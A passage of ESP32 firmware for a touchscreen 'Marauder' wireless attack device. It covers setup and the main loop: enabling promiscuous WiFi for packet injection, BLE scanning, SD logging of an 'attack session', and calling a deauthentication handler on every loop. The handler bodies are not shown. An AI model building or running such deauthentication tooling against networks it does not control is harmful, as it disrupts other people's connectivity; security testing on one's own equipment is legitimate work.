  Serial.printf("CPU: %d MHz\n", getCpuFrequencyMhz());

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  Serial.println("TFT: Initialized");

  ts.begin();
  ts.setRotation(1);
  Serial.println("Touch: Initialized");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true); 
  delay(100);
  esp_wifi_set_promiscuous(true);
  Serial.println("WiFi: Packet injection ready");

  if (!SD.begin(SD_CS)) {
    Serial.println("SD Card mount failed");
  } else {
    logFile = SD.open("/scanlog.txt", FILE_WRITE);
    if (logFile) {
      logFile.println("ESP32 Marauder Multi-Channel Attack Session");
      logFile.flush();
    }
    Serial.println("SD: Initialized");
  }

  initBLE();
  Serial.println("BLE: Initialized");

  currentMenu = MAIN_MENU;
  drawMainMenu();
  
  Serial.println("========================================");
  Serial.println("    MARAUDER READY - MULTI-CHANNEL");
  Serial.println("    WiFi.disconnect(true) enforced");
  Serial.println("========================================");
}

void loop() {
  TS_Point p = ts.getPoint();
  if (p.z > 50) {
    int screenX = map(p.x, TS_MINX, TS_MAXX, 0, tft.width());
    int screenY = map(p.y, TS_MINY, TS_MAXY, 0, tft.height());
    handleTouch(screenX, screenY);
    while (ts.getPoint().z > 50) delay(5);
  }

  switch (currentMenu) {
    case WIFI_SCAN_RESULTS:
      handleWiFiScan();
      break;
    case SCAN_NETWORKS:
      handleWiFiScan();
      handleBLEScan();
      break;
    case BLE_SCAN_RESULTS:
      handleBLEScan();
      break;
  }

  handleDeauth();
  handleBLEOperationDelay();
  handleStatusMessage();

  delay(5);
}
